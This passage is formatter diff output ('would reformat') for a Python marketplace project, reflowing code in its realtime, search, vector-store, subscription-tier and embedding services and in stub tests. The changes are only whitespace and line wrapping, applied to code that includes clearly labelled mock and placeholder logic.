         logger.info(f"Disconnected {disconnected} connections for user {user_id}")
         return disconnected
-    
+
     def get_performance_metrics(self) -> Dict[str, Any]:
         """Get real-time service performance metrics."""
         connection_stats = websocket_manager.get_connection_stats()
-        
+
         # Calculate average latency
         avg_latency = 0
         if self.message_latency_samples:
-            avg_latency = sum(self.message_latency_samples) / len(self.message_latency_samples)
-        
+            avg_latency = sum(self.message_latency_samples) / len(
+                self.message_latency_samples
+            )
+
         return {
             **connection_stats,
             "average_latency_ms": round(avg_latency, 2),
             "latency_samples": len(self.message_latency_samples),
-            "service_status": "operational"
+            "service_status": "operational",
         }
-    
+
     def _track_latency(self, latency_ms: float):
         """Track message latency for performance monitoring."""
         self.message_latency_samples.append(latency_ms)
-        
+
         # Keep only recent samples
         if len(self.message_latency_samples) > self.max_latency_samples:
-            self.message_latency_samples = self.message_latency_samples[-self.max_latency_samples:]
-    
+            self.message_latency_samples = self.message_latency_samples[
+                -self.max_latency_samples :
+            ]
+
     async def health_check(self) -> Dict[str, Any]:
         """Perform health check of the real-time service."""
         try:
             stats = websocket_manager.get_connection_stats()
-            
+
             # Test database connectivity
             database_healthy = True
             try:
                 async with self.database.get_session() as session:
                     # Simple query to test database
                     await session.execute("SELECT 1")
             except Exception as e:
                 database_healthy = False
                 logger.error(f"Database health check failed: {e}")
-            
+
             # Calculate health score
             health_score = 100
             if not database_healthy:
                 health_score -= 50
-            
-            if stats["errors"] > stats["messages_sent"] * 0.1:  # More than 10% error rate
+
+            if (
+                stats["errors"] > stats["messages_sent"] * 0.1
+            ):  # More than 10% error rate
                 health_score -= 30
-            
-            status = "healthy" if health_score >= 80 else "degraded" if health_score >= 50 else "unhealthy"
-            
+
+            status = (
+                "healthy"
+                if health_score >= 80
+                else "degraded" if health_score >= 50 else "unhealthy"
+            )
+
             return {
                 "status": status,
                 "health_score": health_score,
                 "database_healthy": database_healthy,
                 "websocket_stats": stats,
-                "timestamp": datetime.now(timezone.utc).isoformat()
+                "timestamp": datetime.now(timezone.utc).isoformat(),
             }
-            
+
         except Exception as e:
             logger.error(f"Health check failed: {e}")
             return {
                 "status": "unhealthy",
                 "health_score": 0,
                 "error": str(e),
-                "timestamp": datetime.now(timezone.utc).isoformat()
+                "timestamp": datetime.now(timezone.utc).isoformat(),
             }
 
 
 # Global service instance - will be initialized with database in main.py
 realtime_service = None
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/realtime_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/vector_store/test___init__.py	2025-06-14 20:35:30.847867+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/vector_store/test___init__.py	2025-06-19 04:04:12.106928+00:00
@@ -11,10 +11,11 @@
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from __init__ import *
+
 
 class TestInit:
     """Test class for __init__."""
 
     def test_import(self):
@@ -30,7 +31,8 @@
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/vector_store/test___init__.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/vector_store/test_client.py	2025-06-14 20:35:30.847867+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/vector_store/test_client.py	2025-06-19 04:04:12.135679+00:00
@@ -11,10 +11,11 @@
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from client import *
+
 
 class TestClient:
     """Test class for client."""
 
     def test_import(self):
@@ -30,7 +31,8 @@
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/vector_store/test_client.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/vector_store/test_service.py	2025-06-14 20:35:30.847867+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/vector_store/test_service.py	2025-06-19 04:04:12.179013+00:00
@@ -11,10 +11,11 @@
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from service import *
+
 
 class TestService:
     """Test class for service."""
 
     def test_import(self):
@@ -30,7 +31,8 @@
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/vector_store/test_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/vector_store/client.py	2025-06-14 20:35:30.847867+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/vector_store/client.py	2025-06-19 04:04:12.282119+00:00
@@ -27,14 +27,26 @@
     Record,
     ScoredPoint,
     SearchRequest,
 )
 
-from fs_agt_clean.core.vector_store.models import MetricCategory, MetricType, MetricUpdate
-from fs_agt_clean.core.vector_store.models import ProductMetadata as ServiceProductMetadata
-from fs_agt_clean.core.vector_store.models import SearchQuery, SearchResult, VectorStoreConfig
-from fs_agt_clean.core.vector_store.providers.qdrant import QdrantVectorStore as QdrantClient
+from fs_agt_clean.core.vector_store.models import (
+    MetricCategory,
+    MetricType,
+    MetricUpdate,
+)
+from fs_agt_clean.core.vector_store.models import (
+    ProductMetadata as ServiceProductMetadata,
+)
+from fs_agt_clean.core.vector_store.models import (
+    SearchQuery,
+    SearchResult,
+    VectorStoreConfig,
+)
+from fs_agt_clean.core.vector_store.providers.qdrant import (
+    QdrantVectorStore as QdrantClient,
+)
 
 logger = logging.getLogger(__name__)
 
 
 def _convert_to_core_metadata(
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/vector_store/client.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/search/service.py	2025-06-14 20:35:30.847867+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/search/service.py	2025-06-19 04:04:12.329041+00:00
@@ -4,10 +4,11 @@
 from typing import Any, Dict, List, Optional, Union
 
 from fastapi import FastAPI, HTTPException
 
 from fs_agt_clean.core.config.manager import ConfigManager
+
 # Use standard logging instead of missing log_manager
 # from fs_agt_clean.core.monitoring.log_manager import LogManager
 # Import available services with fallbacks
 try:
     from fs_agt_clean.core.services.embeddings import EmbeddingService
@@ -23,11 +24,14 @@
     from fs_agt_clean.services.metrics.service import MetricsService
 except ImportError:
     MetricsService = None
 
 try:
-    from fs_agt_clean.services.search.analytics import SearchAnalyticsService, SearchMetrics
+    from fs_agt_clean.services.search.analytics import (
+        SearchAnalyticsService,
+        SearchMetrics,
+    )
 except ImportError:
     SearchAnalyticsService = None
     SearchMetrics = None
 
 "Search Service Implementation\n\nThis service provides search functionality for the product vector database.\n"
@@ -62,14 +66,22 @@
             config_manager: Configuration manager instance
         """
         self.config = config_manager or ConfigManager()
 
         # Initialize services with fallbacks
-        self.embedding_service = EmbeddingService(self.config) if EmbeddingService else None
-        self.product_service = ProductVectorService(self.config) if ProductVectorService else None
+        self.embedding_service = (
+            EmbeddingService(self.config) if EmbeddingService else None
+        )
+        self.product_service = (
+            ProductVectorService(self.config) if ProductVectorService else None
+        )
         self.metrics_service = MetricsService(self.config) if MetricsService else None
-        self.analytics = SearchAnalyticsService(self.metrics_service) if SearchAnalyticsService and self.metrics_service else None
+        self.analytics = (
+            SearchAnalyticsService(self.metrics_service)
+            if SearchAnalyticsService and self.metrics_service
+            else None
+        )
 
     async def search(self, query: str, limit: int = 10) -> List[Dict[str, Any]]:
         """Simple search method for basic functionality.
 
         Args:
@@ -83,11 +95,11 @@
         return [
             {
                 "id": f"result_{i}",
                 "title": f"Product {i} matching '{query}'",
                 "description": f"Description for product {i}",
-                "score": 0.9 - (i * 0.1)
+                "score": 0.9 - (i * 0.1),
             }
             for i in range(min(limit, 5))
         ]
 
     async def search_by_sku(
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/search/service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/subscription/enhanced_subscription_service.py	2025-06-14 20:35:30.847867+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/subscription/enhanced_subscription_service.py	2025-06-19 04:04:12.347725+00:00
@@ -12,25 +12,29 @@
 from datetime import datetime, timezone, timedelta
 from typing import Any, Dict, List, Optional, Tuple
 from enum import Enum
 from decimal import Decimal
 
-from fs_agt_clean.database.repositories.ai_analysis_repository import FeatureUsageRepository
+from fs_agt_clean.database.repositories.ai_analysis_repository import (
+    FeatureUsageRepository,
+)
 
 logger = logging.getLogger(__name__)
 
 
 class SubscriptionTier(str, Enum):
     """Subscription tier levels."""
+
     FREE = "free"
     BASIC = "basic"
     PREMIUM = "premium"
     ENTERPRISE = "enterprise"
 
 
 class FeatureType(str, Enum):
     """Feature types for usage tracking."""
+
     AI_ANALYSIS = "ai_analysis"
     VECTOR_SEARCH = "vector_search"
     MARKETPLACE_OPTIMIZATION = "marketplace_optimization"
     PERFORMANCE_PREDICTION = "performance_prediction"
     BULK_OPERATIONS = "bulk_operations"
@@ -39,46 +43,47 @@
     SUPPORT = "support"
 
 
 class UsageStatus(str, Enum):
     """Usage status indicators."""
+
     WITHIN_LIMITS = "within_limits"
     APPROACHING_LIMIT = "approaching_limit"
     LIMIT_EXCEEDED = "limit_exceeded"
     UNLIMITED = "unlimited"
 
 
 class SubscriptionFeature:
     """Subscription feature configuration."""
-    
+
     def __init__(
         self,
         feature_type: FeatureType,
         limit: Optional[int] = None,
         unlimited: bool = False,
         cost_per_unit: Decimal = Decimal("0.00"),
-        description: str = ""
+        description: str = "",
     ):
         self.feature_type = feature_type
         self.limit = limit
         self.unlimited = unlimited
         self.cost_per_unit = cost_per_unit
         self.description = description
 
 
 class SubscriptionPlan:
     """Subscription plan configuration."""
-    
+
     def __init__(
         self,
         tier: SubscriptionTier,
         name: str,
         monthly_price: Decimal,
         annual_price: Decimal,
         features: Dict[FeatureType, SubscriptionFeature],
         description: str = "",
-        popular: bool = False
+        popular: bool = False,
     ):
         self.tier = tier
         self.name = name
         self.monthly_price = monthly_price
         self.annual_price = annual_price
@@ -87,43 +92,43 @@
         self.popular = popular
 
 
 class UsageMetrics:
     """Usage metrics for a specific feature."""
-    
+
     def __init__(
         self,
         feature_type: FeatureType,
         current_usage: int,
         limit: Optional[int],
         unlimited: bool,
         reset_date: datetime,
-        usage_history: List[Dict[str, Any]]
+        usage_history: List[Dict[str, Any]],
     ):
         self.feature_type = feature_type
         self.current_usage = current_usage
         self.limit = limit
         self.unlimited = unlimited
         self.reset_date = reset_date
         self.usage_history = usage_history
-    
+
     def get_usage_percentage(self) -> float:
         """Get usage as percentage of limit."""
         if self.unlimited or self.limit is None:
             return 0.0
         return (self.current_usage / self.limit) * 100 if self.limit > 0 else 0.0
-    
+
     def get_status(self) -> UsageStatus:
         """Get current usage status."""
         if self.unlimited:
             return UsageStatus.UNLIMITED
-        
+
         if self.limit is None:
             return UsageStatus.WITHIN_LIMITS
-        
+
         percentage = self.get_usage_percentage()
-        
+
         if percentage >= 100:
             return UsageStatus.LIMIT_EXCEEDED
         elif percentage >= 80:
             return UsageStatus.APPROACHING_LIMIT
         else:
@@ -131,254 +136,306 @@
 
 
 class EnhancedSubscriptionService:
     """
     Enhanced subscription management service.
-    
+
     This service provides:
     - Tier-based feature enforcement
     - Usage tracking and analytics
     - Upgrade suggestions and recommendations
     - Billing and payment integration
     """
-    
+
     def __init__(self):
         """Initialize the enhanced subscription service."""
         self.usage_repository = FeatureUsageRepository()
-        
+
         # Define subscription plans
         self.subscription_plans = self._initialize_subscription_plans()
-        
+
         logger.info("Enhanced Subscription Service initialized")
-    
-    def _initialize_subscription_plans(self) -> Dict[SubscriptionTier, SubscriptionPlan]:
+
+    def _initialize_subscription_plans(
+        self,
+    ) -> Dict[SubscriptionTier, SubscriptionPlan]:
         """Initialize subscription plan configurations."""
-        
+
         # Free tier features
         free_features = {
             FeatureType.AI_ANALYSIS: SubscriptionFeature(
-                FeatureType.AI_ANALYSIS, limit=10, description="10 AI analyses per month"
+                FeatureType.AI_ANALYSIS,
+                limit=10,
+                description="10 AI analyses per month",
             ),
             FeatureType.VECTOR_SEARCH: SubscriptionFeature(
-                FeatureType.VECTOR_SEARCH, limit=50, description="50 semantic searches per month"
+                FeatureType.VECTOR_SEARCH,
+                limit=50,
+                description="50 semantic searches per month",
             ),
             FeatureType.MARKETPLACE_OPTIMIZATION: SubscriptionFeature(
-                FeatureType.MARKETPLACE_OPTIMIZATION, limit=5, description="5 marketplace optimizations per month"
+                FeatureType.MARKETPLACE_OPTIMIZATION,
+                limit=5,
+                description="5 marketplace optimizations per month",
             ),
             FeatureType.API_CALLS: SubscriptionFeature(
-                FeatureType.API_CALLS, limit=1000, description="1,000 API calls per month"
+                FeatureType.API_CALLS,
+                limit=1000,
+                description="1,000 API calls per month",
             ),
             FeatureType.STORAGE: SubscriptionFeature(
                 FeatureType.STORAGE, limit=100, description="100 MB storage"
-            )
+            ),
         }
-        
+
         # Basic tier features
         basic_features = {
             FeatureType.AI_ANALYSIS: SubscriptionFeature(
-                FeatureType.AI_ANALYSIS, limit=100, description="100 AI analyses per month"
+                FeatureType.AI_ANALYSIS,
+                limit=100,
+                description="100 AI analyses per month",
             ),
             FeatureType.VECTOR_SEARCH: SubscriptionFeature(
-                FeatureType.VECTOR_SEARCH, limit=500, description="500 semantic searches per month"
+                FeatureType.VECTOR_SEARCH,
+                limit=500,
+                description="500 semantic searches per month",
             ),
             FeatureType.MARKETPLACE_OPTIMIZATION: SubscriptionFeature(
-                FeatureType.MARKETPLACE_OPTIMIZATION, limit=50, description="50 marketplace optimizations per month"
+                FeatureType.MARKETPLACE_OPTIMIZATION,
+                limit=50,
+                description="50 marketplace optimizations per month",
             ),
             FeatureType.PERFORMANCE_PREDICTION: SubscriptionFeature(
-                FeatureType.PERFORMANCE_PREDICTION, limit=25, description="25 performance predictions per month"
+                FeatureType.PERFORMANCE_PREDICTION,
+                limit=25,
+                description="25 performance predictions per month",
             ),
             FeatureType.API_CALLS: SubscriptionFeature(
-                FeatureType.API_CALLS, limit=10000, description="10,000 API calls per month"
+                FeatureType.API_CALLS,
+                limit=10000,
+                description="10,000 API calls per month",
             ),
             FeatureType.STORAGE: SubscriptionFeature(
                 FeatureType.STORAGE, limit=1000, description="1 GB storage"
             ),
             FeatureType.SUPPORT: SubscriptionFeature(
                 FeatureType.SUPPORT, unlimited=True, description="Email support"
-            )
+            ),
         }
-        
+
         # Premium tier features
         premium_features = {
             FeatureType.AI_ANALYSIS: SubscriptionFeature(
-                FeatureType.AI_ANALYSIS, limit=1000, description="1,000 AI analyses per month"
+                FeatureType.AI_ANALYSIS,
+                limit=1000,
+                description="1,000 AI analyses per month",
             ),
             FeatureType.VECTOR_SEARCH: SubscriptionFeature(
-                FeatureType.VECTOR_SEARCH, unlimited=True, description="Unlimited semantic searches"
+                FeatureType.VECTOR_SEARCH,
+                unlimited=True,
+                description="Unlimited semantic searches",
             ),
             FeatureType.MARKETPLACE_OPTIMIZATION: SubscriptionFeature(
-                FeatureType.MARKETPLACE_OPTIMIZATION, unlimited=True, description="Unlimited marketplace optimizations"
+                FeatureType.MARKETPLACE_OPTIMIZATION,
+                unlimited=True,
+                description="Unlimited marketplace optimizations",
             ),
             FeatureType.PERFORMANCE_PREDICTION: SubscriptionFeature(
-                FeatureType.PERFORMANCE_PREDICTION, unlimited=True, description="Unlimited performance predictions"
+                FeatureType.PERFORMANCE_PREDICTION,
+                unlimited=True,
+                description="Unlimited performance predictions",
             ),
             FeatureType.BULK_OPERATIONS: SubscriptionFeature(
-                FeatureType.BULK_OPERATIONS, unlimited=True, description="Bulk operations support"
+                FeatureType.BULK_OPERATIONS,
+                unlimited=True,
+                description="Bulk operations support",
             ),
             FeatureType.API_CALLS: SubscriptionFeature(
-                FeatureType.API_CALLS, limit=100000, description="100,000 API calls per month"
+                FeatureType.API_CALLS,
+                limit=100000,
+                description="100,000 API calls per month",
             ),
             FeatureType.STORAGE: SubscriptionFeature(
                 FeatureType.STORAGE, limit=10000, description="10 GB storage"
             ),
             FeatureType.SUPPORT: SubscriptionFeature(
                 FeatureType.SUPPORT, unlimited=True, description="Priority support"
-            )
+            ),
         }
-        
+
         # Enterprise tier features
         enterprise_features = {
             feature_type: SubscriptionFeature(
-                feature_type, unlimited=True, description=f"Unlimited {feature_type.value}"
+                feature_type,
+                unlimited=True,
+                description=f"Unlimited {feature_type.value}",
             )
             for feature_type in FeatureType
         }
-        
+
         return {
             SubscriptionTier.FREE: SubscriptionPlan(
-                SubscriptionTier.FREE, "Free", Decimal("0.00"), Decimal("0.00"),
-                free_features, "Perfect for getting started", False
+                SubscriptionTier.FREE,
+                "Free",
+                Decimal("0.00"),
+                Decimal("0.00"),
+                free_features,
+                "Perfect for getting started",
+                False,
             ),
             SubscriptionTier.BASIC: SubscriptionPlan(
-                SubscriptionTier.BASIC, "Basic", Decimal("29.99"), Decimal("299.99"),
-                basic_features, "Great for small businesses", False
+                SubscriptionTier.BASIC,
+                "Basic",
+                Decimal("29.99"),
+                Decimal("299.99"),
+                basic_features,
+                "Great for small businesses",
+                False,
             ),
             SubscriptionTier.PREMIUM: SubscriptionPlan(
-                SubscriptionTier.PREMIUM, "Premium", Decimal("99.99"), Decimal("999.99"),
-                premium_features, "Perfect for growing businesses", True
+                SubscriptionTier.PREMIUM,
+                "Premium",
+                Decimal("99.99"),
+                Decimal("999.99"),
+                premium_features,
+                "Perfect for growing businesses",
+                True,
             ),
             SubscriptionTier.ENTERPRISE: SubscriptionPlan(
-                SubscriptionTier.ENTERPRISE, "Enterprise", Decimal("299.99"), Decimal("2999.99"),
-                enterprise_features, "For large organizations", False
-            )
+                SubscriptionTier.ENTERPRISE,
+                "Enterprise",
+                Decimal("299.99"),
+                Decimal("2999.99"),
+                enterprise_features,
+                "For large organizations",
+                False,
+            ),
         }
-    
+
     async def check_feature_access(
         self,
         user_id: str,
         feature_type: FeatureType,
-        subscription_tier: SubscriptionTier
+        subscription_tier: SubscriptionTier,
     ) -> Tuple[bool, Dict[str, Any]]:
         """
         Check if user has access to a specific feature.
-        
+
         Args:
             user_id: User ID
             feature_type: Feature to check
             subscription_tier: User's subscription tier
-            
+
         Returns:
             Tuple of (has_access, access_info)
         """
         try:
             # Get subscription plan
             plan = self.subscription_plans.get(subscription_tier)
             if not plan:
                 return False, {"error": "Invalid subscription tier"}
-            
+
             # Get feature configuration
             feature = plan.features.get(feature_type)
             if not feature:
                 return False, {"error": "Feature not available in this tier"}
-            
+
             # Check if feature is unlimited
             if feature.unlimited:
                 return True, {
                     "access": True,
                     "unlimited": True,
-                    "message": "Unlimited access"
+                    "message": "Unlimited access",
                 }
-            
+
             # Get current usage
             usage_metrics = await self.get_usage_metrics(user_id, feature_type)
-            
+
             # Check if within limits
             if feature.limit is None:
                 has_access = True
             else:
                 has_access = usage_metrics.current_usage < feature.limit
-            
+
             return has_access, {
                 "access": has_access,
                 "unlimited": False,
                 "current_usage": usage_metrics.current_usage,
                 "limit": feature.limit,
                 "usage_percentage": usage_metrics.get_usage_percentage(),
                 "status": usage_metrics.get_status().value,
-                "reset_date": usage_metrics.reset_date.isoformat()
+                "reset_date": usage_metrics.reset_date.isoformat(),
             }
-            
+
         except Exception as e:
             logger.error(f"Error checking feature access: {e}")
             return False, {"error": str(e)}
-    
+
     async def get_usage_metrics(
-        self,
-        user_id: str,
-        feature_type: FeatureType
+        self, user_id: str, feature_type: FeatureType
     ) -> UsageMetrics:
         """Get usage metrics for a specific feature."""
         try:
             # Calculate reset date (first day of next month)
             now = datetime.now(timezone.utc)
             if now.month == 12:
                 reset_date = datetime(now.year + 1, 1, 1, tzinfo=timezone.utc)
             else:
                 reset_date = datetime(now.year, now.month + 1, 1, tzinfo=timezone.utc)
-            
+
             # Get usage stats from repository
             # For now, return mock data since we don't have actual usage tracking
             current_usage = 0  # This would come from actual usage tracking
-            
+
             return UsageMetrics(
                 feature_type=feature_type,
                 current_usage=current_usage,
                 limit=None,  # Will be set based on subscription tier
                 unlimited=False,
                 reset_date=reset_date,
-                usage_history=[]
+                usage_history=[],
             )
-            
+
         except Exception as e:
             logger.error(f"Error getting usage metrics: {e}")
             return UsageMetrics(
                 feature_type=feature_type,
                 current_usage=0,
                 limit=None,
                 unlimited=False,
                 reset_date=datetime.now(timezone.utc) + timedelta(days=30),
-                usage_history=[]
+                usage_history=[],
             )
-    
+
     async def track_feature_usage(
         self,
         user_id: str,
         feature_type: FeatureType,
         subscription_tier: SubscriptionTier,
-        metadata: Optional[Dict[str, Any]] = None
+        metadata: Optional[Dict[str, Any]] = None,
     ) -> bool:
         """Track feature usage for a user."""
         try:
             # Track usage in repository
             await self.usage_repository.track_usage(
                 user_id=user_id,
                 feature_name=feature_type.value,
                 subscription_tier=subscription_tier.value,
-                metadata=metadata
+                metadata=metadata,
             )
-            
+
             logger.info(f"Tracked usage for user {user_id}: {feature_type.value}")
             return True
-            
+
         except Exception as e:
             logger.error(f"Error tracking feature usage: {e}")
             return False
-    
+
     def get_subscription_plans(self) -> Dict[str, Any]:
         """Get all available subscription plans."""
         plans = {}
-        
+
         for tier, plan in self.subscription_plans.items():
             plans[tier.value] = {
                 "name": plan.name,
                 "tier": plan.tier.value,
                 "monthly_price": float(plan.monthly_price),
@@ -388,60 +445,74 @@
                 "features": {
                     feature_type.value: {
                         "limit": feature.limit,
                         "unlimited": feature.unlimited,
                         "description": feature.description,
-                        "cost_per_unit": float(feature.cost_per_unit)
+                        "cost_per_unit": float(feature.cost_per_unit),
                     }
                     for feature_type, feature in plan.features.items()
-                }
+                },
             }
-        
+
         return plans
-    
+
     async def get_upgrade_suggestions(
-        self,
-        user_id: str,
-        current_tier: SubscriptionTier
+        self, user_id: str, current_tier: SubscriptionTier
     ) -> List[Dict[str, Any]]:
         """Get upgrade suggestions based on usage patterns."""
         try:
             suggestions = []
-            
+
             # Get current plan
             current_plan = self.subscription_plans.get(current_tier)
             if not current_plan:
                 return suggestions
-            
+
             # Check usage for each feature
             for feature_type in FeatureType:
                 usage_metrics = await self.get_usage_metrics(user_id, feature_type)
-                
-                if usage_metrics.get_status() in [UsageStatus.APPROACHING_LIMIT, UsageStatus.LIMIT_EXCEEDED]:
+
+                if usage_metrics.get_status() in [
+                    UsageStatus.APPROACHING_LIMIT,
+                    UsageStatus.LIMIT_EXCEEDED,
+                ]:
                     # Find next tier that provides more of this feature
-                    for tier in [SubscriptionTier.BASIC, SubscriptionTier.PREMIUM, SubscriptionTier.ENTERPRISE]:
+                    for tier in [
+                        SubscriptionTier.BASIC,
+                        SubscriptionTier.PREMIUM,
+                        SubscriptionTier.ENTERPRISE,
+                    ]:
                         if tier.value <= current_tier.value:
                             continue
-                        
+
                         plan = self.subscription_plans[tier]
                         feature = plan.features.get(feature_type)
-                        
-                        if feature and (feature.unlimited or (feature.limit and feature.limit > usage_metrics.limit)):
-                            suggestions.append({
-                                "reason": f"Approaching limit for {feature_type.value}",
-                                "current_usage": usage_metrics.current_usage,
-                                "current_limit": usage_metrics.limit,
-                                "suggested_tier": tier.value,
-                                "suggested_plan": plan.name,
-                                "new_limit": feature.limit if not feature.unlimited else "unlimited",
-                                "monthly_price": float(plan.monthly_price),
-                                "annual_price": float(plan.annual_price)
-                            })
+
+                        if feature and (
+                            feature.unlimited
+                            or (feature.limit and feature.limit > usage_metrics.limit)
+                        ):
+                            suggestions.append(
+                                {
+                                    "reason": f"Approaching limit for {feature_type.value}",
+                                    "current_usage": usage_metrics.current_usage,
+                                    "current_limit": usage_metrics.limit,
+                                    "suggested_tier": tier.value,
+                                    "suggested_plan": plan.name,
+                                    "new_limit": (
+                                        feature.limit
+                                        if not feature.unlimited
+                                        else "unlimited"
+                                    ),
+                                    "monthly_price": float(plan.monthly_price),
+                                    "annual_price": float(plan.annual_price),
+                                }
+                            )
                             break
-            
+
             return suggestions
-            
+
         except Exception as e:
             logger.error(f"Error getting upgrade suggestions: {e}")
             return []
 
 
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/subscription/enhanced_subscription_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/tests/core/auth/test_auth_service.py	2025-06-14 20:35:30.851876+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/tests/core/auth/test_auth_service.py	2025-06-19 04:04:12.596928+00:00
@@ -1,15 +1,15 @@
-
 """
 Tests for the Authentication Service.
 """
 
 import unittest
 from unittest.mock import patch, MagicMock
 
 import sys
 import os
+
 sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "../../../")))
 from core.auth.auth_service import AuthService
 
 
 class TestAuthService(unittest.TestCase):
@@ -17,10 +17,11 @@
 
     def setUp(self):
         """Set up the test environment."""
         # Create a simple AuthService with minimal dependencies
         from core.auth.auth_service import AuthConfig, RedisManager, VaultSecretManager
+
         config = AuthConfig()
         redis_manager = RedisManager()
         secret_manager = VaultSecretManager()
         self.auth_service = AuthService(config, redis_manager, secret_manager)
 
would reformat /home/brend/Flipsync_Final/fs_agt_clean/tests/core/auth/test_auth_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/vector/embedding_service.py	2025-06-14 20:35:30.847867+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/vector/embedding_service.py	2025-06-19 04:04:12.621734+00:00
@@ -13,188 +13,198 @@
 from datetime import datetime, timezone
 from typing import Any, Dict, List, Optional, Tuple, Union
 
 try:
     import numpy as np
+
     NUMPY_AVAILABLE = True
 except ImportError:
     np = None
     NUMPY_AVAILABLE = False
 
-from fs_agt_clean.core.config.vector_config import vector_db_manager, VectorCollectionType
-from fs_agt_clean.core.ai.simple_llm_client import SimpleLLMClient, SimpleLLMConfig as LLMConfig, ModelProvider, ModelType
+from fs_agt_clean.core.config.vector_config import (
+    vector_db_manager,
+    VectorCollectionType,
+)
+from fs_agt_clean.core.ai.simple_llm_client import (
+    SimpleLLMClient,
+    SimpleLLMConfig as LLMConfig,
+    ModelProvider,
+    ModelType,
+)
 
 logger = logging.getLogger(__name__)
 
 
 class EmbeddingModel:
     """Embedding model configuration and metadata."""
-    
+
     def __init__(
         self,
         name: str,
         dimension: int,
         max_tokens: int,
-        cost_per_1k_tokens: float = 0.0
+        cost_per_1k_tokens: float = 0.0,
     ):
         self.name = name
         self.dimension = dimension
         self.max_tokens = max_tokens
         self.cost_per_1k_tokens = cost_per_1k_tokens
 
 
 class VectorEmbeddingService:
     """
     Vector embedding service for semantic operations.
-    
+
     This service provides:
     - Text embedding generation using various models
     - Vector storage and retrieval in Qdrant
     - Semantic similarity search
     - Product and category embeddings
     """
-    
+
     def __init__(self, llm_config: Optional[LLMConfig] = None):
         """Initialize the vector embedding service."""
         self.llm_config = llm_config or LLMConfig(
-            provider=ModelProvider.OLLAMA,
-            model_type=ModelType.LLAMA3_1_8B
+            provider=ModelProvider.OLLAMA, model_type=ModelType.LLAMA3_1_8B
         )
-        
+
         # Available embedding models
         self.embedding_models = {
             "text-embedding-ada-002": EmbeddingModel(
                 name="text-embedding-ada-002",
                 dimension=1536,
                 max_tokens=8191,
-                cost_per_1k_tokens=0.0001
+                cost_per_1k_tokens=0.0001,
             ),
             "local-embedding": EmbeddingModel(
                 name="local-embedding",
                 dimension=384,  # Sentence transformers default
                 max_tokens=512,
-                cost_per_1k_tokens=0.0
-            )
+                cost_per_1k_tokens=0.0,
+            ),
         }
-        
+
         self.default_model = "local-embedding"
         self.embedding_cache = {}  # Simple in-memory cache
-        
+
         logger.info("Vector Embedding Service initialized")
-    
+
     async def generate_embedding(
         self,
         text: str,
         model_name: Optional[str] = None,
-        cache_key: Optional[str] = None
+        cache_key: Optional[str] = None,
     ) -> Optional[List[float]]:
         """
         Generate vector embedding for text.
-        
+
         Args:
             text: Text to embed
             model_name: Embedding model to use
             cache_key: Optional cache key for the embedding
-            
+
         Returns:
             Vector embedding as list of floats
         """
         model_name = model_name or self.default_model
-        
+
         # Generate cache key if not provided
         if cache_key is None:
             cache_key = self._generate_cache_key(text, model_name)
-        
+
         # Check cache first
         if cache_key in self.embedding_cache:
             logger.debug(f"Using cached embedding for: {cache_key[:16]}...")
             return self.embedding_cache[cache_key]
-        
+
         try:
             # Generate embedding based on model
             if model_name == "text-embedding-ada-002":
                 embedding = await self._generate_openai_embedding(text)
             else:
                 embedding = await self._generate_local_embedding(text)
-            
+
             # Cache the result
             if embedding:
                 self.embedding_cache[cache_key] = embedding
-                logger.debug(f"Generated and cached embedding: {len(embedding)} dimensions")
-            
+                logger.debug(
+                    f"Generated and cached embedding: {len(embedding)} dimensions"
+                )
+
             return embedding
-            
+
         except Exception as e:
             logger.error(f"Error generating embedding: {e}")
             return None
-    
+
     async def _generate_openai_embedding(self, text: str) -> Optional[List[float]]:
         """Generate embedding using OpenAI API."""
         # This would integrate with OpenAI's embedding API
         # For now, return a mock embedding
         logger.warning("OpenAI embedding not implemented, using mock embedding")
         return await self._generate_mock_embedding(text, 1536)
-    
+
     async def _generate_local_embedding(self, text: str) -> Optional[List[float]]:
         """Generate embedding using local model."""
         # This would use sentence-transformers or similar
         # For now, return a mock embedding
         logger.debug("Generating local embedding (mock)")
         return await self._generate_mock_embedding(text, 384)
-    
+
     async def _generate_mock_embedding(self, text: str, dimension: int) -> List[float]:
         """Generate mock embedding for testing purposes."""
         if not NUMPY_AVAILABLE:
             # Simple hash-based mock embedding
             text_hash = hashlib.md5(text.encode()).hexdigest()
             seed = int(text_hash[:8], 16)
-            
+
             # Generate deterministic "embedding"
             embedding = []
             for i in range(dimension):
-                seed = (seed * 1103515245 + 12345) & 0x7fffffff
